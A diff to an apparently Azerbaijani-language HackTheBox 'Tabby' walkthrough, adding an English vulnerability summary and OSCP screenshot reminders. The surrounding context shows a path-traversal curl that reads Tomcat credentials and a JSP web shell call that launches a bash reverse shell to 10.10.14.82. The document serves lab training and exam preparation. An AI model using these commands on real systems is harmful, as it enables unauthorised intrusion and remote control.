@@ -118,6 +118,8 @@ curl -s "http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/
 
 ## İstismar (WAR deploy)
 
+No CVE (custom vulnerability) - local file inclusion in the custom `news.php` endpoint exposes the Tomcat `manager-script` credentials from `tomcat-users.xml`; deploying a WAR file gives RCE as the `tomcat` user.
+
 ### Girişin yoxlanılması
 
 ```bash
@@ -174,6 +176,9 @@ curl -s -G "http://tabby.htb:8080/cmd/cmd.jsp" \
   --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.82/4444 0>&1'"
 ```
 
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
+
 **Shell `tomcat` istifadəçisindən (uid 997).**
 
 ### Sabitləşdirmə
@@ -219,6 +224,9 @@ su ash
 cat /home/ash/user.txt
 # <USER_FLAG>
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ---
 
@@ -276,6 +284,9 @@ cd /mnt/root/root
 cat root.txt
 # <ROOT_FLAG>
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ---
 
